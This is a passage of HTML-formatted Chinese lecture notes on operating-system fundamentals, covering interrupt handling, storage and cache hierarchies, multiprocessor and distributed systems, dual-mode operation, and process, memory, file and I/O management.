&lt;li&gt;&lt;strong&gt;进程切换&lt;/strong&gt;：当请求者等待时，OS可能切换到另一个程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;I/O完成&lt;/strong&gt;：I/O完成后控制器中断OS&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;处理结果&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;同步I/O&lt;/strong&gt;：OS处理I/O然后唤醒程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;异步I/O&lt;/strong&gt;：OS发送信号给程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;中断驱动的io循环&#34;&gt;中断驱动的I/O循环
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;操作系统通常是&lt;strong&gt;中断驱动&lt;/strong&gt;的&lt;/li&gt;
&lt;li&gt;中断传输控制到中断服务程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中断向量&lt;/strong&gt;：包含所有服务程序地址的表格&lt;/li&gt;
&lt;li&gt;在服务另一个中断时，传入的中断被禁用以防止中断丢失&lt;/li&gt;
&lt;li&gt;中断处理程序必须保存（被中断的）执行状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;中断处理详细流程&#34;&gt;中断处理详细流程
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;中断识别&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;硬件产生中断信号&lt;/li&gt;
&lt;li&gt;CPU在每个指令周期结束时检查中断请求&lt;/li&gt;
&lt;li&gt;确定中断源和中断类型&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;现场保护&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;操作系统保存CPU的执行状态&lt;/li&gt;
&lt;li&gt;保存寄存器和程序计数器(PC)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中断分发&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;OS确定哪个设备造成了中断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;轮询(Polling)&lt;strong&gt;或&lt;/strong&gt;向量中断系统&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中断处理&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;OS通过调用设备驱动程序处理中断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;现场恢复&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;OS将CPU执行恢复到保存的状态&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;存储结构&#34;&gt;存储结构
&lt;/h3&gt;&lt;h4 id=&#34;存储层次结构&#34;&gt;存储层次结构
&lt;/h4&gt;&lt;h5 id=&#34;主存储器&#34;&gt;主存储器
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;主内存&lt;/strong&gt;：CPU能够直接访问的唯一大容量存储
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;随机访问&lt;/strong&gt;，通常是&lt;strong&gt;易失性&lt;/strong&gt;的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;辅助存储&lt;/strong&gt;：大容量非易失性存储
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;磁盘&lt;/strong&gt;是最常见的辅助存储设备(HDD)&lt;/li&gt;
&lt;li&gt;由覆盖磁性记录材料的刚性金属或玻璃盘片组成&lt;/li&gt;
&lt;li&gt;磁盘表面逻辑上分为&lt;strong&gt;磁道&lt;/strong&gt;和&lt;strong&gt;扇区&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;磁盘控制器决定OS和设备之间的交互&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;存储系统层次结构&#34;&gt;存储系统层次结构
&lt;/h5&gt;&lt;p&gt;存储系统可以按层次组织，考虑以下因素：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;速度(Speed)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;成本(Cost)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;易失性(Volatility)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;存储性能层次（从快到慢）&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CPU寄存器&lt;/li&gt;
&lt;li&gt;CPU缓存(L1/L2/L3)&lt;/li&gt;
&lt;li&gt;主内存(RAM)&lt;/li&gt;
&lt;li&gt;辅助存储(SSD/HDD)&lt;/li&gt;
&lt;li&gt;光学存储/磁带&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;缓存&#34;&gt;缓存
&lt;/h3&gt;&lt;h4 id=&#34;缓存基本概念&#34;&gt;缓存基本概念
&lt;/h4&gt;&lt;h5 id=&#34;缓存原理&#34;&gt;缓存原理
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;缓存&lt;/strong&gt;：将信息复制到更快存储系统中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主内存&lt;/strong&gt;可以看作是辅助存储的缓存&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CPU缓存&lt;/strong&gt;是主内存的缓存&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存是在多个级别执行的重要原理&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;硬件、操作系统、用户程序等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;缓存工作机制&#34;&gt;缓存工作机制
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;数据复制&lt;/strong&gt;：使用中的数据从较慢存储临时复制到较快存储&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存检查&lt;/strong&gt;：首先检查较快存储(缓存)以确定数据是否存在&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存命中&lt;/strong&gt;：如果在缓存中，直接从缓存使用数据(快速)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存未命中&lt;/strong&gt;：如果不在缓存中，先将数据复制到缓存然后使用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存特点&lt;/strong&gt;：缓存通常比被缓存的存储小&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;缓存管理&#34;&gt;缓存管理
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;缓存管理&lt;/strong&gt;是重要的设计问题
&lt;ul&gt;
&lt;li&gt;缓存大小&lt;/li&gt;
&lt;li&gt;替换策略&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多任务环境&lt;/strong&gt;必须小心使用最新值，无论它存储在存储层次的哪里&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多处理器环境&lt;/strong&gt;必须在硬件中提供缓存一致性，确保所有CPU在其缓存中都有最新值&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;虚拟缓存-vs-物理缓存&#34;&gt;虚拟缓存 vs 物理缓存
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;虚拟缓存&lt;/strong&gt;：使用虚拟地址进行缓存&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;物理缓存&lt;/strong&gt;：使用物理地址进行缓存&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存一致性&lt;/strong&gt;：多处理器必须保证缓存一致性&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;计算机系统架构&#34;&gt;计算机系统架构
&lt;/h3&gt;&lt;h4 id=&#34;系统分类&#34;&gt;系统分类
&lt;/h4&gt;&lt;p&gt;根据通用处理器数量分类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;单处理器系统&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多处理器系统&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;单处理器系统&#34;&gt;单处理器系统
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;大多数老系统只有一个通用处理器
&lt;ul&gt;
&lt;li&gt;如智能手机、PC、服务器、主机&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大多数系统也有专用处理器&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;多处理器系统&#34;&gt;多处理器系统
&lt;/h4&gt;&lt;h5 id=&#34;基本特征&#34;&gt;基本特征
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;别名&lt;/strong&gt;：并行系统、紧耦合系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优势&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;增加吞吐量&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;规模经济&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;增加可靠性&lt;/strong&gt;：优雅降级或容错&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;多处理器类型&#34;&gt;多处理器类型
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;非对称多处理(Asymmetric Multiprocessing)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对称多处理(SMP, Symmetric Multiprocessing)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;多核设计&#34;&gt;多核设计
&lt;/h4&gt;&lt;h5 id=&#34;多核-vs-超线程&#34;&gt;多核 vs 超线程
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多核&lt;/strong&gt;：单个芯片中多个CPU核心&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;超线程&lt;/strong&gt;：两个程序可以同时使用一个执行单元(在一个核心内)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;性能依赖&lt;/strong&gt;：操作系统、编译器、应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;numa架构&#34;&gt;NUMA架构
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;非统一内存访问系统(Non-Uniform Memory Access)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;本地内存访问快速&lt;/strong&gt;，可扩展性好&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;集群系统&#34;&gt;集群系统
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多个系统&lt;/strong&gt;通过高速网络协同工作&lt;/li&gt;
&lt;li&gt;通常通过**存储区域网络(SAN)**共享存储&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高可用性服务&lt;/strong&gt;，可以在故障中生存&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;非对称集群&lt;/strong&gt;：一台机器处于热备用模式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对称集群&lt;/strong&gt;：多个节点运行应用程序，相互监控&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高性能计算(HPC)&lt;/strong&gt;：应用程序必须编写以使用并行化&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;分布式系统&#34;&gt;分布式系统
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;独立系统集合&lt;/strong&gt;，可能是异构的，通过网络互连&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络OS&lt;/strong&gt;允许系统交换消息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分布式系统&lt;/strong&gt;创建单一系统的错觉&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;特殊用途系统&#34;&gt;特殊用途系统
&lt;/h4&gt;&lt;h5 id=&#34;实时嵌入式系统&#34;&gt;实时嵌入式系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;最普遍的计算机形式&lt;/li&gt;
&lt;li&gt;变化很大&lt;/li&gt;
&lt;li&gt;使用特殊用途(有限用途)实时OS&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;多媒体系统&#34;&gt;多媒体系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;数据流必须根据时间限制传送&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;手持系统&#34;&gt;手持系统
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;如PDA、智能手机&lt;/li&gt;
&lt;li&gt;CPU、内存和电源有限&lt;/li&gt;
&lt;li&gt;过去使用功能简化的OS&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;点对点计算&#34;&gt;点对点计算
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;分布式系统的另一种模型&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;P2P不区分客户端和服务器&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;所有节点都被视为对等体&lt;/li&gt;
&lt;li&gt;可以充当客户端、服务器或两者&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;节点必须加入P2P网络&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;向中央查找服务注册其服务，或&lt;/li&gt;
&lt;li&gt;通过发现协议广播请求和响应服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：BitTorrent、Napster、Gnutella和区块链平台&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;操作系统操作&#34;&gt;操作系统操作
&lt;/h3&gt;&lt;h4 id=&#34;多道程序设计multiprogramming&#34;&gt;多道程序设计(Multiprogramming)
&lt;/h4&gt;&lt;h5 id=&#34;基本概念&#34;&gt;基本概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多道程序设计&lt;/strong&gt;对于效率是必要的&lt;/li&gt;
&lt;li&gt;单个用户无法始终保持CPU和I/O设备忙碌&lt;/li&gt;
&lt;li&gt;用户的计算任务被组织为&lt;strong&gt;作业&lt;/strong&gt;(代码和数据)&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;工作机制&#34;&gt;工作机制
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;作业调度&lt;/strong&gt;：内核调度作业，使CPU始终有事可做&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内存管理&lt;/strong&gt;：系统中作业的子集保存在内存中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作业切换&lt;/strong&gt;：当作业必须等待(如I/O)时，内核切换到另一个作业&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;多任务multitasking&#34;&gt;多任务(Multitasking)
&lt;/h4&gt;&lt;h5 id=&#34;时间共享概念&#34;&gt;时间共享概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;**时间共享(多任务)**扩展了多道程序设计&lt;/li&gt;
&lt;li&gt;OS频繁切换作业，用户可以与每个正在运行的作业交互&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;响应时间&lt;/strong&gt;应该&amp;lt; 1秒&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;特征&#34;&gt;特征
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;每个用户&lt;/strong&gt;至少有一个程序在内存中执行(&lt;strong&gt;进程&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CPU调度&lt;/strong&gt;：如果几个作业同时准备运行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;虚拟/物理内存&lt;/strong&gt;：使程序员更容易&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;双模式操作&#34;&gt;双模式操作
&lt;/h4&gt;&lt;h5 id=&#34;基本概念-1&#34;&gt;基本概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;操作系统通常是中断驱动的&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;效率&lt;/strong&gt;，重新获得控制(定时器中断)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;双模式操作&lt;/strong&gt;允许OS保护自身和其他系统组件&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;模式类型&#34;&gt;模式类型
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;用户模式&lt;/strong&gt;和&lt;strong&gt;内核模式&lt;/strong&gt;(或其他名称)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模式位&lt;/strong&gt;区分CPU是在运行用户代码还是内核代码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特权指令&lt;/strong&gt;：一些指令被指定为特权的，只能在内核中执行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统调用&lt;/strong&gt;：将模式改为内核，从调用返回将其重置为用户&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;模式间转换&#34;&gt;模式间转换
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统调用、异常、中断&lt;/strong&gt;导致内核/用户模式之间的转换&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;定时器timer&#34;&gt;定时器(Timer)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;防止无限循环&lt;/strong&gt;或进程占用资源&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;启用定时器&lt;/strong&gt;：设置硬件在某个时间段后中断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;OS设置定时器&lt;/strong&gt;：在调度进程之前设置定时器以重新获得控制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;调度定时器&lt;/strong&gt;：通常是周期性的(如250Hz)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无滴答内核&lt;/strong&gt;：按需定时器中断(Linux)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;资源管理&#34;&gt;资源管理
&lt;/h3&gt;&lt;h4 id=&#34;进程管理&#34;&gt;进程管理
&lt;/h4&gt;&lt;h5 id=&#34;进程基本概念&#34;&gt;进程基本概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;进程&lt;/strong&gt;是正在执行的程序
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;程序&lt;/strong&gt;是被动实体，&lt;strong&gt;进程&lt;/strong&gt;是活动实体&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系统有许多进程并发运行&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;从程序到进程&#34;&gt;从程序到进程
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;程序&lt;/strong&gt;：存储在磁盘上的被动代码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进程&lt;/strong&gt;：程序装载到内存后的活动实体&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进程需要资源&lt;/strong&gt;来完成其任务：
&lt;ul&gt;
&lt;li&gt;CPU、内存、I/O、文件、初始化数据等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源回收&lt;/strong&gt;：进程终止时，OS回收所有可重用资源&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;进程管理活动&#34;&gt;进程管理活动
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;进程创建和终止&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进程挂起和恢复&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进程同步原语&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进程通信原语&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;死锁处理&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;从进程到线程&#34;&gt;从进程到线程
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;单线程进程&lt;/strong&gt;有一个程序计数器
&lt;ul&gt;
&lt;li&gt;程序计数器指定下一条要执行的指令的位置&lt;/li&gt;
&lt;li&gt;处理器按顺序执行指令，一次一条，直到完成&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多线程进程&lt;/strong&gt;每个线程有一个程序计数器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;线程的好处&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;创建开销小&lt;/li&gt;
&lt;li&gt;上下文切换快&lt;/li&gt;
&lt;li&gt;共享内存空间&lt;/li&gt;
&lt;li&gt;并发执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;内存管理&#34;&gt;内存管理
&lt;/h4&gt;&lt;h5 id=&#34;内存管理基本概念&#34;&gt;内存管理基本概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;内存&lt;/strong&gt;是CPU可直接访问的主要存储&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据处理前后&lt;/strong&gt;都需要保存在内存中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;所有指令&lt;/strong&gt;都应该在内存中才能执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;内存管理目标&#34;&gt;内存管理目标
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;优化CPU利用率和响应时间&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;为程序员提供虚拟内存视图&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;内存管理活动&#34;&gt;内存管理活动
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;跟踪&lt;/strong&gt;内存的哪些部分正在被使用以及被谁使用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;决定&lt;/strong&gt;哪些进程和数据移入和移出内存&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分配和释放&lt;/strong&gt;根据需要分配和释放内存空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;文件系统管理&#34;&gt;文件系统管理
&lt;/h4&gt;&lt;h5 id=&#34;文件系统基本概念&#34;&gt;文件系统基本概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;OS提供统一的逻辑数据存储视图&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件&lt;/strong&gt;是抽象物理属性的逻辑存储单元&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件&lt;/strong&gt;通常组织到&lt;strong&gt;目录&lt;/strong&gt;中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;访问控制&lt;/strong&gt;决定谁可以访问文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;文件系统管理活动&#34;&gt;文件系统管理活动
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;创建和删除&lt;/strong&gt;文件和目录&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;操作原语&lt;/strong&gt;来操作文件和目录&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;映射文件&lt;/strong&gt;到辅助存储&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;备份文件&lt;/strong&gt;到稳定(非易失性)存储介质&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;大容量存储管理&#34;&gt;大容量存储管理
&lt;/h4&gt;&lt;h5 id=&#34;基本概念-2&#34;&gt;基本概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;磁盘子系统&lt;/strong&gt;管理大容量存储&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;磁盘用于存储&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;不适合主内存的数据&lt;/li&gt;
&lt;li&gt;必须保存&amp;quot;长&amp;quot;时间的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;整个系统速度&lt;/strong&gt;取决于磁盘子系统及其算法&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;某些存储不需要快速&lt;/strong&gt;(如光存储或磁带)&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;大容量存储管理活动&#34;&gt;大容量存储管理活动
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;空闲空间管理&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;存储分配&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;磁盘调度&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;数据迁移通过存储层&#34;&gt;数据迁移通过存储层
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统必须使用最新值&lt;/strong&gt;，无论它存储在哪里&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多级数据一致性&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多处理器的缓存一致性&lt;/strong&gt;(缓存窥探)：由硬件实现&lt;/li&gt;
&lt;li&gt;所有CPU在其缓存中都有最新值&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多进程或多线程的同步&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分布式环境情况更复杂&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;一个数据可能存在多个副本：如何同步更改？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;io系统管理&#34;&gt;I/O系统管理
&lt;/h4&gt;&lt;h5 id=&#34;io子系统职责&#34;&gt;I/O子系统职责
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;I/O子系统&lt;/strong&gt;向用户隐藏硬件设备的特性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;I/O子系统负责&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;管理I/O内存&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓冲&lt;/strong&gt;：在数据传输时临时存储数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存&lt;/strong&gt;：在更快存储中存储数据部分以提高性能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;假脱机&lt;/strong&gt;：一个作业的输出与其他作业的输入重叠&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;设备驱动程序接口&#34;&gt;设备驱动程序接口
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;OS可能提供通用设备驱动程序接口&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：对程序员好：面向对象设计模式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点&lt;/strong&gt;：从安全角度看：大量使用函数指针&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;操作系统设计原则&#34;&gt;操作系统设计原则
&lt;/h3&gt;&lt;h4 id=&#34;策略与机制分离&#34;&gt;策略与机制分离
&lt;/h4&gt;&lt;h5 id=&#34;基本概念-3&#34;&gt;基本概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;机制(Mechanism)&lt;/strong&gt;：关于系统&amp;quot;如何&amp;quot;的问题
&lt;ul&gt;
&lt;li&gt;操作系统如何执行上下文切换&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;策略(Policy)&lt;/strong&gt;：&amp;ldquo;哪个&amp;quot;问题
&lt;ul&gt;
&lt;li&gt;应该切换到哪个进程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;其他示例&#34;&gt;其他示例
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;机制示例&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;如何分配内存&lt;/li&gt;
&lt;li&gt;如何调度CPU&lt;/li&gt;
&lt;li&gt;如何处理中断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;策略示例&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;哪个进程获得内存&lt;/li&gt;
&lt;li&gt;哪个进程优先运行&lt;/li&gt;
&lt;li&gt;哪个中断优先处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;优势与劣势&#34;&gt;优势与劣势
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;优势&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;灵活性：可以更改策略而不改变机制&lt;/li&gt;
&lt;li&gt;模块化：清晰的分层设计&lt;/li&gt;
&lt;li&gt;可维护性：更容易理解和修改&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
